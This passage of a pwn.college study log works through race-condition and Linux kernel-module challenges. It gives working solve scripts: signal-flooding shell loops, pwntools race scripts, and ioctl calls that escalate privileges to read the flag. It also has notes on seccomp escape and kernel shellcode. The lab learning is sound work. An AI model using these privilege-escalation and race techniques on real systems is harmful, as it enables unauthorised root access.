/home/hacker/1 ./dir<br></code></pre></div></td></tr></table></figure><p><code>./dir/a/home/b</code> </p><p>测试:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">(for i in &#123;1..20000&#125;;do /challenge/babyrace_level6.1 ./dir/a/home/b;done) \<br>| egrep &#x27;Error|pwn&#x27; | sort | uniq -c<br></code></pre></div></td></tr></table></figure><p>成功率降到了20/20000, 变成千分之一了……..</p><h4 id="level7-4"><a href="#level7-4" class="headerlink" title="level7"></a>level7</h4><p>保护全开. 做不出来, 去看了看<code>.0</code>程序的race point在哪里.</p><p>没看懂. 噢, 我在discord上面看到了提示!!! 才想起来视频里有提到signal, 而且这次也有signal handler.</p><p>一开始还在想这岂不是要等十分钟, 然后突然想起来有系统调用可以给其他进程发送信号.</p><p>而且程序中的timeout_handler也只是执行logout而已. 这样race point就很明显了, 只要一次成功就可以了.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;win_authed&quot;</span>) )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( privilege_level )<br>      &#123;<br><span class="hljs-comment">//就是这里--------------------------------------------------------</span><br>        <span class="hljs-keyword">if</span> ( privilege_level == <span class="hljs-number">1</span> )<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your privilege level is too low!&quot;</span>);<br>        <span class="hljs-keyword">else</span><br>          win();<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You are not logged in!&quot;</span>);<br>      &#125;&#125;<br></code></pre></div></td></tr></table></figure><p>有一个kill系统调用, <del>要知道pid参数的话那还是直接用pwntools启动, 不知道python的sendline耗时如何….</del>算了不用了</p><ul><li>总之命令行里启动challenge, 永真循环里echo <code>login</code>和<code>win_authed</code>两条命令, 即<code>login\nwin_authed\n</code>.</li><li>然后命令行永真循环, 不停kill pid 14.</li></ul><p>非常直接, 成功率也是非常的低:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">while true;do kill -s 14 465;done<br>(while true;do printf &#x27;login\nwin_authed\n&#x27;;done)|/challenge/babyrace_level7.1|grep &#x27;pwn&#x27;<br>ps aux<br></code></pre></div></td></tr></table></figure><h4 id="level8-4"><a href="#level8-4" class="headerlink" title="level8"></a>level8</h4><ul><li>调试可以使用practice mode中的sudo gdb, 或者使用pwntools以非set_uid启动程序.<ul><li><code>info thread</code> + <code>thread [num]</code> </li><li>第一个hit breadpoint的线程会停下来, gdb还会切换到那个线程上.</li></ul></li><li><code>ps auxH</code> 显示线程.</li><li>看了几眼python上的concurrent.futures<ul><li>都在下面了. 主要就是processExecutor, 参数是上限, 形象成一个pool(进程池)可以根据需要使用.</li></ul></li></ul><p><a href="https://akkadia.org/drepper/tls.pdf">ELF Handling For TLS</a> | <a href="https://maskray.me/blog/2021-02-14-all-about-thread-local-storage">哪位神的TLS variable文章</a> | <a href="https://www.cs.cmu.edu/afs/cs/academic/class/15492-f07/www/pthreads.html">看起来不错的教程</a><br>上面是有关程序中使用的fs来定位线程私有变量的原理.</p><p>每个线程有自己的空间, 但是privilege_level是全局的. 使用pwntools开两个连接, 和上一题一样的做法.</p><p>成功率2/10000=0.2‰</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> pwn<br><br>pwn.context.update(encoding=<span class="hljs-string">&#x27;latin&#x27;</span>)<br><br>process = pwn.process(<span class="hljs-string">&#x27;/challenge/babyrace_level8.1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">work</span>(<span class="hljs-params">cmd</span>):</span><br>    <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote:<br>        pwn.info(remote.recvline().decode())<br>        remote.send(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;cmd&#125;</span> &#x27;</span> * <span class="hljs-number">10000</span>)<br>        pwn.info(remote.clean().decode())<br><br><span class="hljs-keyword">with</span> concurrent.futures.ProcessPoolExecutor(<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> pool:<br>    future = []<br>    future.append(pool.submit(work, <span class="hljs-string">&#x27;login&#x27;</span>))<br>    future.append(pool.submit(work, <span class="hljs-string">&#x27;logout&#x27;</span>))<br>    future.append(pool.submit(work, <span class="hljs-string">&#x27;win_authed&#x27;</span>))<br>    concurrent.futures.wait(future)<br></code></pre></div></td></tr></table></figure><h4 id="level9-4"><a href="#level9-4" class="headerlink" title="level9"></a>level9</h4><p>看到个新模块<code>psutil</code>. </p><p>执行send_redacted_flag命令时, 向函数栈帧中的的缓冲区写入”REDACTED: “, terminated with null-byte, which is 11bytes long(plus null-byte). Then calling open-&gt;read to read flag into the buffer, right after the previous string’s null-byte.</p><p>if now try to use command <code>receive_message</code> to print out string containing the flag, the function will stop at 11th position, because write() function’s <code>n</code> argment is given by strlen() evaluating string in global_message.</p><p>so the the procedure is as follows:</p><ul><li><p>In one thread(connection), first send <code>send_redacted_flag</code> command. </p></li><li><p>Between this and next command, another thread send <code>send_message</code> command, overwrite until the global_message’s 11th char, <strong>before assigning null-byte to the end of string</strong>.</p><img src="../../image/pwn-modules/image-20220519155802133.png" alt="image-20220519155802133" style="zoom:80%;" /></li><li><p>and first thread now continue executing at <code>receive_message</code> command. after the strlen() function, the return value means 11+[flag’s len], then used in the argment of write().</p></li></ul><p>how to write script….</p><ul><li>two connections. one send <code>send_redacted_flag -&gt; receive_message</code> sequence, another send <code>send_message</code> with <code>&#39;whatthefuckisthat&#39;</code> continuously(or separated by space in a longlonglong bytestring).</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> pwn<br><br>process = pwn.process(<span class="hljs-string">&#x27;./babyrace_level9.1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">work</span>(<span class="hljs-params">cmd</span>):</span><br>    <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote:<br>        pwn.info(remote.recvline().decode())<br>        remote.send(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;cmd&#125;</span> &#x27;</span> * <span class="hljs-number">10000</span>)<br>        pwn.info(remote.clean().decode())<br><br><span class="hljs-keyword">with</span> concurrent.futures.ProcessPoolExecutor(<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> pool:<br>    thread = []<br>    thread.append(pool.submit(work, <span class="hljs-string">&#x27;send_redacted_flag receive_message&#x27;</span>))<br>    thread.append(pool.submit(work, <span class="hljs-string">&#x27;send_message whatthefuck&#x27;</span>))<br>    concurrent.futures.wait(thread)<br></code></pre></div></td></tr></table></figure><p>something interesting happen….</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">9999     Message: <br>   1 [*] Message: <br>   1     Message: REDAChED: \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: REDAChefuckisthatandthis\at the fuck? this is true flag&#125;<br> 504     Message: REDACTED: [*] Function (send_message/send_redacted_flag/receive_message/quit): <br>5444     Message: REDACTED: \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: REDACTefu \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: whatCTEfuckisthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: whattheD: \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: whatthef: \isthatandthis\at the fuck? this is true flag&#125;<br>  18     Message: whatthefuc[*] Function (send_message/send_redacted_flag/receive_message/quit): <br>   1     Message: whatthefuc\isthatandthis\at the fuck? this is true flag&#125;<br>4027     Message: whatthefuckisthatandthis\at the fuck? this is true flag&#125;<br><br>   1     Message: whatthefuckisn.ctalege&#123;what the fuck? this is true flag&#125;<br></code></pre></div></td></tr></table></figure><p>by patching the program, something strange happened….. how does line 11 occur….? can write syscall to be interrupted and then reenter?</p><p>anyway, that’s the way it is.</p><h4 id="level10-4"><a href="#level10-4" class="headerlink" title="level10"></a>level10</h4><p>global_message with semaphore: sem_wait() + sem_post()……………</p><p>我又不会了…… 做这个真是违反直觉的思考. scp了.0程序, 希望能看出一点提示..没看出来.</p><h4 id="level11-4"><a href="#level11-4" class="headerlink" title="level11"></a>level11</h4><p>没看出和上一题有什么区别. 不过在discord上面看到了一点东西.</p><blockquote><p>10, 11 have semaphores on broadcast, 11 has a printf instead of strlen-read</p></blockquote><p>dicord上面都用的是sigpipe. 这个会调用pthread_exit()函数. </p><p>.0程序停在了message赋值的每一次循环, 这个时候可以发送sigpipe直接结束线程, 这样sem_post不会执行, global_message_mutex也不再可用, 意味着没有线程能够再进入critical section. </p><blockquote><p>Or not consuming input so the writes to the socket block at the right time</p><p>不知道这能不能行. 这只能在send_message停下.</p></blockquote><p>processes are as follows:</p><ul><li>one connection sends <code>send_redacted_flag</code> command, then completes the str copy. </li><li>another or still the same connection sends <code>send_message</code> command with <code>whatthefuckisthis</code>, causing overlapping the null-byte between prompt and flag. after null-byte, before last byte, sending SIGPIPE to stop thread.</li><li>another connection send <code>receive_message</code>.</li><li>every program run can only test once.</li></ul><p>succeeding in .0 practice.</p><h1 id="module-D-kernel"><a href="#module-D-kernel" class="headerlink" title="module D-kernel"></a>module D-kernel</h1><h4 id="key-point"><a href="#key-point" class="headerlink" title="key point:"></a>key point:</h4><h5 id="Intro"><a href="#Intro" class="headerlink" title="Intro:"></a>Intro:</h5><ul><li><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-1.html">linux syscall <em>DETAILS</em> (<strong>linux inside</strong>)</a> |  <a href="https://www.kernel.org/doc/html/latest/">linux_kernel_doc</a> | <a href="https://www.felixcloutier.com/x86/syscall">syscall instruction</a> | <a href="https://gcc.gnu.org/onlinedocs/gcc/Variable-Attributes.html">Attributes of Variables(gcc)</a> | <ul><li>you cannot find <em>noderef</em> or <em>address_space</em> in the GCC docs because they are not GCC attributes. They have meaning only for <a href="https://en.wikipedia.org/wiki/Sparse">Sparse</a>.<br>about <a href="https://www.linuxquestions.org/questions/linux-kernel-70/what-does-__attribute__-noderef-address_space-2-mean-4175493101/">the effect</a>.</li></ul></li><li><strong>Modern solution to Rings:</strong> Ring -1, <em>Hypervisor Mode</em>. Able to intercept sensitive Ring 0 actions done by guests and handle them in the host OS.</li><li>syscall High-level overview:<ol><li>At bootup, in Ring 0, the kernel sets MSR_LSTAR to point to the syscall handler routine.</li><li>When a userspace (Ring 3) process wants to interact with the kernel, it car call syscall.<br>a. Privilege level switches to Ring 0.<br>b. Control flow jumps to value of MSR_LSTAR.<br>c.  Return address saved to <strong>rcx</strong>.<br>d. That’s basically it! <a href="https://www.felixcloutier.com/x86/syscall">https://www.felixcloutier.com/x86/syscall</a></li><li>When the kernel is ready to return to userspace, it calls the appropriate return instruction (i.e., <strong>sysret</strong> for syscall).<br> a. Privilege level switches to Ring 3.<br> b. Control flow jumps to rcx.<br> c. That’s basically it!</li><li><code>x86-64: rdi   rsi   rdx   r10   r8    r9    -</code><br>We can see the 6 args are stored in these registers. rcx is used to store syscall return address, so args skip rcx.</li></ol></li><li>exploit dirctions:<ul><li>From the network: remotely-trigged exploits (packets of death, etc). Rare!</li><li>From userspace: vulnerabilities in syscall and ioctl handlers (i.e., launched from inside a <strong>sandbox</strong>!)</li><li>From devices</li></ul></li></ul><h5 id="kernel-module"><a href="#kernel-module" class="headerlink" title="kernel module"></a>kernel module</h5><ul><li><code>lsmod</code> list kernel module. like device drivers(graphic card), filesystems, networking functionality, other stuff.<br>all with <code>.ko</code> extension.</li></ul><p>How to interact with kernel module for further exploitation?</p><ul><li>historically, kernel modules could add syscall entries. nowadays less used.</li><li>interrupts. a module could register a interrupt handler to <strong>hook</strong>. <code>int3</code> and <code>int1</code> are one-byte interrupt instructions which may be useful.</li><li>files. <ul><li><code>/dev</code>: mostly traditional devices (i.e., /dev/dsp for audio)</li></ul><ol start="2"><li><code>/proc</code>: started out in System V Unix as information about running processes. Linux expanded it into in <strong>a disastrous mess of kernel interfaces</strong>.</li></ol><ul><li><code>/sys</code>: non-process information interface with the kernel. </li><li>A module can register a file in one of the above locations.<br>Userspace code can <em>read|open()</em> that file to interact with the module!<br>or <em>ioctrl()</em> function sends setting and querying non-stream data(i.e., webcam resolution <strong>settings</strong> as opposed to webcam video <strong>stream</strong>).</li></ul></li></ul><p>driver interaction:</p><ul><li>reads data from userspace (using <code>copy_from_user</code>, a kernel API)</li><li>“does stuff” (open files, read files, interact with hardware, etc)</li><li>writes data to userspace (using copy_to_user)</li><li>returns to userspace</li></ul><p>kernel module: <a href="https://www.kernel.org/doc/htmldocs/kernel-api/index.html">manpage section 9</a> |  <a href="https://www.kernel.org/doc/htmldocs/kernel-api/index.html">kernel doc</a> </p><ul><li>compilation:<ul><li>kernel modules are all listed in the <code>pwnkernel/src/</code> </li><li>at the end of the build.sh, there is a <em>building modules</em> procedure. it calls Make makefile in src dirctory then copys <code>.ko</code> file to fs directory being mounted at <code>/home/ctf</code>. </li><li>so before compilation, adding an entry to makefile for newly added module.</li></ul></li><li>command: <u>must be used under root. or sh not found</u>.<ul><li><code>insmod</code> command: load kernel module. or through <code>init_module</code> system call.</li><li><code>lsmod</code> : list all modules.</li><li><code>rmmod</code> : remove module.</li></ul></li><li>testing module:<ul><li><code>hello_log.ko</code>: just print something to kernel ring buffer.</li><li><code>hello_dev_char.ko</code>: register a character device. may use head, dd(with option like: if=/dev/pwn-college-char of=/proc/self/fd/1 bs=128 count=1) , etc, to read from it.</li><li><code>hello_ioctl</code>: exposes a /dev device with ioctl interface</li><li><code>hello_proc_char</code><strong>:</strong> exposes a /proc device</li><li><code>make_root</code>: exposes a /proc device with ioctl interface and an evil backdoor!</li></ul></li></ul><h5 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h5><p><a href="https://docs.google.com/presentation/d/1tcR4YsVhN2kVUfe8RJw56dtSs-QOwp4-g8qgI0Q3kFM/edit#slide=id.g75a3c0c177_2_16">SLIDE</a>. in make_root.c.</p><h5 id="Escape-Seccomp"><a href="#Escape-Seccomp" class="headerlink" title="Escape Seccomp"></a>Escape Seccomp</h5><p><a href="https://docs.google.com/presentation/d/1YMlOERClX6Yi8Fb9DYxBBJ5MYB1C-_F75XKkoSmbl8k/edit#slide=id.ga2eb818465_0_0">SLIDE</a> </p><p>mainly disable <code>TIF_SECCOMP</code> bit. all in SLIDES.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> &#123;</span><br>    <span class="hljs-comment">// LOTS of stuff, including</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">cred</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> <span class="hljs-title">thread_info</span>;</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> &#123;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> flags;<span class="hljs-comment">/* low level flags */</span><br>    u32 status;<span class="hljs-comment">/* thread synchronous flags */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><p>Yan demonstrates how to use make_root.ko to escape seccomp and escalating privilege.</p><h5 id="memory-managment"><a href="#memory-managment" class="headerlink" title="memory managment"></a>memory managment</h5><ul><li>linux use four level page table:</li></ul><img src="../../image/pwn-modules/image-20220523182826589.png" alt="image-20220523182826589" style="zoom:80%;" /> <ul><li>only lower 48 bits are used in addressing. higher 12bits used to denote the kernel space. and ARM arch take these bits as tag for security concerns. <a href="https://source.android.com/devices/tech/debug/tagged-pointers">android source</a> | <a href="https://llvm.org/devmtg/2018-10/slides/Serebryany-Stepanov-Tsyrklevich-Memory-Tagging-Slides-LLVM-2018.pdf">LLVM memory tagging</a> | </li><li>Virtual Machine isolation: The extended page table.</li><li>MMU + TLB</li><li>other architectures are analogous in <strong>paging</strong>. Linux <em>requires</em> a hardware MMU (although certain forks do not).</li><li><strong>The Old Way</strong>: Old Linuxes could access physical memory via <strong>/dev/mem</strong> as root.<br><strong>The New Way</strong>: If you want to get at physical memory now, you must do it from the <strong>kernel</strong>. Physical memory is mapped <em>contiguously</em> in kernel’s virtual memory space for convenient access. Two macros, <code>phys_to_virt()</code> and <code>virt_to_phys()</code>.</li></ul><h5 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h5><p><a href="https://docs.google.com/presentation/d/1DNxufs_WlQRkzBMjPD7UE1qRrd87XDGpfQSPkiajEyE/edit#slide=id.gfbef220448_0_48">SLIDES</a> many links.</p><ul><li><p><strong>Stack canaries:</strong> leak the canary!<br><strong>kASLR:</strong> leak the kernel base address!<br><strong>Heap/stack regions NX:</strong> ROP!</p></li><li><p>Function Granular ASLR.</p></li><li><p>Supervisor Memory Protection:</p><ul><li><strong>SMEP.</strong><br>Prevents kernel-space code from <strong>E</strong>xecuting userspace memory <em>at all ever</em>.</li><li><strong>SMAP.</strong><br>Prevents kernel-space from even <strong>A</strong>ccessing userspace memory <em>unless the AC flag in the RFLAGS register is set</em>. Two ring0 instructions, stac and clac, manage this bit.</li><li>Why separate these? in SLIDES.</li></ul></li></ul><h5 id="kernel-shellcode"><a href="#kernel-shellcode" class="headerlink" title="kernel shellcode"></a>kernel shellcode</h5><ul><li>you cant use syscalls in kernel. just use call instruction with symbol addresses in /proc/kallsyms</li><li>KASLR. if it is on, then I need to find a vulnerability to leak an kernel symbol address.</li><li>indirect calls.</li><li>seccomp escaping: notice gs segment register to figure out where the task struct is.</li><li>The kernel is WAY too complex to figure out offsetsmanually.<br>Best option:<ol><li>Write a kernel module in C with the actions you want<br>your shellcode to do.</li><li>Build it for the kernel you want to attack (e.g., using<br>the vm build command in pwn.college).</li><li> Reverse-engineer it to see how these actions work in<br>assembly.</li><li>Re-implement that assembly in your shellcode!</li></ol></li><li>be careful with kernel code context! Try to have it act like a normal function and <strong>return</strong> when it’s done.</li></ul><h5 id="Env-setup"><a href="#Env-setup" class="headerlink" title="Env setup"></a>Env setup</h5><p>build for old kernel 5.4: <a href="https://github.com/pwncollege/pwnkernel">set up an environment</a> </p><ul><li>first complie stopping at <code>thunk_64.o</code>, due to missing symbol table.<ul><li>revise <code>linux-5.4/tools/objtool/elf.c</code> line 380 -&gt; <a href="https://www.spinics.net/lists/kernel/msg3797871.html">link</a> </li></ul></li><li>then revise build.sh and take a vm snapshot.</li><li>then revise <code>arch/x86/boot/compressed/pgtable_64.c</code> to fix multiple definitions of <code>__force_order</code>. <a href="https://lkml.org/lkml/2019/12/21/121">link</a> </li><li>OK. total size is 4.3G. by <code>du -sh pwnkernel</code> </li></ul><p>VM by qemu: </p><ul><li><p>require: new version of gdb, kernel with debug symbols, ASLR is off(in ./launch there is <code>-append</code> option for qemu, <strong>check its usage</strong>).</p></li><li><p>because the kernel is started with qemu, so can debug with gdb through port 1234.</p><p><code>gdb linux-5.4/vmlinux</code> + <code>target remote :1234</code> (I added it into .gdbinit in pwnkernel/)</p></li><li><p><code>cat /proc/kallsyms</code>  you can see all symbols in kernel. because we disabled the kernel address space randomization, it will always be the same.</p></li><li><p> only a limited number of commands will work in vm. look <code>ls /bin</code> for details. Because the shell is provided by busybox, so there is a lack of functionality.</p></li><li><p>use <code>sh -l</code> or <code>su - ctf</code> to load ~/.profile. there is some convenient aliases.</p></li></ul><p><a href="https://docs.google.com/presentation/d/1Ik7EWjn_9ywzCW3MpJJ0eVdIvhIMP6brObBQQDtYDCo/edit#slide=id.ga548015bd5_0_114">further setup is here</a> </p><p>tips: </p><ul><li>wget command in build.sh has been added with -c option(–continue), which means that it won’t repeat downloadiing when there is an already existing file in the same directory.</li><li><code>mkdir -p</code> no error if existing.</li></ul><h5 id="online-environment"><a href="#online-environment" class="headerlink" title="online environment"></a>online environment</h5><ul><li><code>vm debug</code>: I have no idea about what happened…….it suddenly worked and then shutdown…..</li><li>太蠢了, 全都停不下来. 等会看一下writing kernel shellcode. 没用啊, 难不成全部都变成本地做? 也不是不行就是了…….</li><li> 只是不能debug. 暂未发现解决办法.</li></ul><h4 id="level1-3"><a href="#level1-3" class="headerlink" title="level1"></a>level1</h4><p>.0 level calls <code>printk()</code> function to give some info in kernel ring buffer. Obviously, .1 level doesn’t. </p><p>tested in ipython:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>fd = os.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/proc/pwncollege&#x27;</span>, os.O_RDWR)<br>os.write(fd, <span class="hljs-string">&#x27;password&#x27;</span>)<br>os.read(fd, <span class="hljs-number">60</span>)<br></code></pre></div></td></tr></table></figure><h4 id="level2-3"><a href="#level2-3" class="headerlink" title="level2"></a>level2</h4><p>unlike previous level, there is no device_read() function, rather printk(flag) exists in device_write with password check.</p><p>script is the same way.</p><h4 id="level3-4"><a href="#level3-4" class="headerlink" title="level3"></a>level3</h4><p>the kernel module defines a win() function which will elevate the calling process privilege.</p><p>once pass the check, current process(i.e., ipython), will run as root. then use <code>!cat /flag</code>. everything is done.</p><p>even while the password is for previous level, it just still works……..</p><h4 id="level4-5"><a href="#level4-5" class="headerlink" title="level4"></a>level4</h4><p>hijack the kernel module by <code>ioctl()</code>. it is in python <code>fcntl</code> module. <a href="https://docs.python.org/3.10/library/fcntl.html">doc</a> </p><p>in python fcntl.fcntl() almost equals to fcntl.ioctl(), <strong>except for ioctol’s <em>arg</em> argument can accept <em>bytes</em></strong>.</p><p>script:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> fcntl, os<br>fd = os.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/proc/pwncollege&#x27;</span>, os.O_RDWR)<br>fcntl.ioctl(fd, <span class="hljs-number">1337</span>, <span class="hljs-string">b&#x27;ruysmamctudpofzh&#x27;</span>)<br><span class="hljs-comment">#then !cat /flag</span><br></code></pre></div></td></tr></table></figure><h4 id="level5-6"><a href="#level5-6" class="headerlink" title="level5"></a>level5</h4><p>device_ioctl() calls __x86_indirect_thunk_rbx.</p><p>retpoline, __x86_indirect_thunk_rbx……what’re these?</p><p><a href="https://elixir.bootlin.com/linux/v5.4/source/arch/x86/lib/retpoline.S#L11">here</a> it is(<a href="https://stackoverflow.com/questions/48089426/what-is-a-retpoline-and-how-does-it-work">here</a> is repoline and google’s <a href="https://support.google.com/faqs/answer/7625886">article</a>). when debugging, I find that it just merely jumps to the address the register(<strong>rbx</strong>) points to. so many nested macros in kernel code…..</p><p>ATTENTION: The following piece of code in fact create a function, and in kernel module it calls the it. Thus module will push return address onto stack and when returning from the <em>THUNK</em>  function it’ll come back to complete the rest of cleanups.</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">GENERATE_THUNK(_ASM_BX)<br>↘<br>#define __EXPORT_THUNK(sym) _ASM_NOKPROBE(sym); EXPORT_SYMBOL(sym)<br>#define EXPORT_THUNK(reg) __EXPORT_THUNK(__x86_indirect_thunk_ ## reg)<br>#define GENERATE_THUNK(reg) THUNK reg ; EXPORT_THUNK(reg)<br>↘<br>.macro THUNK reg<br>.section .text.__x86.indirect_thunk<br><br>ENTRY(__x86_indirect_thunk_\reg)<br>CFI_STARTPROC<br>JMP_NOSPEC %\reg  #simply a jmp to shellcode. no change to the stack. <br>#we can directly use ret to come back to module code.<br>CFI_ENDPROC<br>ENDPROC(__x86_indirect_thunk_\reg)<br>.endm<br></code></pre></div></td></tr></table></figure><p>what value dose the rbx hold before execute <code>jmp rbx</code> instruction? it is ioctl()’s <em>arg</em> argument.</p><p>by <code>cat /proc/kallsyms | grep win</code> command,  the win()’s address can be easily found. <code> ffffffffc0000c5d t win  [challenge]</code> </p><p>but in pwn.college….</p><img src="../../image/pwn-modules/image-20220524205647223.png" alt="image-20220524205647223" style="zoom:80%;" /><p>let’s give up this mysterious environment.</p><blockquote><p>Now I know why it would happen……<br>normal user that doesn’t have enough privilege will find all kernel symbols with address 0.<br>then what should i do in pwn.college? emmmmmm<br>maybe i need to grep in practice mode and come back.</p></blockquote><p>script:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-number">2</span>);<br>    ioctl(fd, <span class="hljs-number">1337</span>, <span class="hljs-number">0xffffffffc0000c5d</span>);<br>    <span class="hljs-comment">//after privilege escalation</span><br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">2</span>);<br>    sendfile(<span class="hljs-number">1</span>, fd2, <span class="hljs-literal">NULL</span>, <span class="hljs-number">60</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>I win.</p><img src="../../image/pwn-modules/image-20220524211101441.png" alt="image-20220524211101441" style="zoom:80%;" /><h4 id="level6-6"><a href="#level6-6" class="headerlink" title="level6"></a>level6</h4><p>begin kernel shellcoding!</p><ul><li>at the beginning of module, it calls <code>kmalloc()</code> function to allocate a chunk of virtual address 